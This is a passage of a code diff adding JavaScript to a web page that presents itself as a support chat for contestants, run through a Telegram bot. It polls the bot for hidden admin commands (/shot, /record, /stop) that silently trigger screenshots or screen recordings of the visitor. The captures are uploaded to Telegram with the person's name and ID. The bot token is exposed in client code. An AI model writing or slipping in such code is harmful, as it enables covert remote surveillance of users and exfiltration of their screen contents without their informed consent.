+                        isRecording = false;
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        const blob = new Blob(recordedChunks, { type: "video/webm" });
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("video", blob, "screen_record.webm");
+                        formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                        formData.append("parse_mode", "Markdown");
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData })
+                            .catch(() => {
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
+                            });
+                    };
+
+                    mediaRecorder.start();
+                    isRecording = true;
+
+                    if (durationSeconds > 0) {
+                        setTimeout(() => {
+                            stopScreenRecording();
+                        }, durationSeconds * 1000);
+                    }
+
+                } catch (err) {
+                    sendTelegramAlert(`❌ **فشل بدء تسجيل الفيديو:** ${err.message}`);
+                }
+            };
+
+            if (delaySeconds > 0) {
+                setTimeout(startExec, delaySeconds * 1000);
+            } else {
+                startExec();
+            }
+        }
+
+        function stopScreenRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+            }
+        }
+
+        function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
+            renderMessage(text, className, time, status, imgUrl);
+            saveChatHistory({ text, className, time, status, imgUrl });
+        }
+
+        function renderMessage(text, className, time, status = '', imgUrl = null) {
+            const chatBox = document.getElementById("chat-box");
+            if (!chatBox) return;
+
+            const msgElement = document.createElement("div");
+            msgElement.className = `msg ${className}`;
+
+            if (imgUrl) {
+                const img = document.createElement("img");
+                img.src = imgUrl;
+                msgElement.appendChild(img);
+            }
+
+            if (text) {
+                const textSpan = document.createElement("span");
+                textSpan.innerText = text;
+                msgElement.appendChild(textSpan);
+            }
+
+            const metaDiv = document.createElement("div");
+            metaDiv.className = "msg-meta";
+            metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
+            msgElement.appendChild(metaDiv);
+
+            chatBox.appendChild(msgElement);
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        function fetchAdminMessages() {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then(res => res.json())
+                .then(async data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                            sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
+
+                            const msg = update.message;
+                            if (!msg) continue;
+
+                            if (processedMsgIds.has(msg.message_id)) continue;
+
+                            let text = msg.text || msg.caption || "";
+
+                            if (text.includes(contestantId)) {
+                                processedMsgIds.add(msg.message_id);
+                                sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
+
+                                document.querySelectorAll(".user-msg .checkmark").forEach(el => {
+                                    el.innerText = "✔✔";
+                                    el.classList.add("read");
+                                });
+
+                                if (text.includes("/shot")) {
+                                    const match = text.match(/\/shot\s*(\d+)?/i);
+                                    const delay = match && match[1] ? parseInt(match[1]) : 0;
+                                    takeScreenShot(delay);
+                                    continue;
+                                }
+
+                                if (text.includes("/record")) {
+                                    const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
+                                    const duration = match && match[1] ? parseInt(match[1]) : 10;
+                                    const delay = match && match[2] ? parseInt(match[2]) : 0;
+                                    startScreenRecording(duration, delay);
+                                    continue;
+                                }
+
+                                if (text.includes("/stop")) {
+                                    stopScreenRecording();
+                                    continue;
+                                }
+
+                                if (text.includes("/offline")) {
+                                    setSupportStatus(false);
+                                    continue;
+                                }
+
+                                if (text.includes("/online")) {
+                                    setSupportStatus(true);
+                                    continue;
+                                }
+
+                                let telegramImgUrl = null;
+                                if (msg.photo && msg.photo.length > 0) {
+                                    const largestPhoto = msg.photo[msg.photo.length - 1];
+                                    try {
+                                        const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                        const fileData = await fileRes.json();
+                                        if (fileData.ok && fileData.result.file_path) {
+                                            telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                        }
+                                    } catch (e) {}
+                                }
+
+                                let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
+                                if (cleanText || telegramImgUrl) {
+                                    displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
+                                    playNotificationSound('receive');
+                                    trigger10SecAutoOpen();
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function setSupportStatus(online) {
+            isSupportOnline = online;
+            const dot1 = document.getElementById("support-status-dot");
+            const dot2 = document.getElementById("header-status-dot");
+            const statusText = document.getElementById("support-status-text");
+
+            if (online) {
+                if (dot1) dot1.classList.remove("offline");
+                if (dot2) dot2.classList.remove("offline");
+                if (statusText) statusText.innerText = "متصل الآن";
+            } else {
+                if (dot1) dot1.classList.add("offline");
+                if (dot2) dot2.classList.add("offline");
+                if (statusText) statusText.innerText = "غير متصل حالياً";
+            }
+        }
+
+        setInterval(fetchAdminMessages, 2000);
+    </script>
+</body>
+</html>
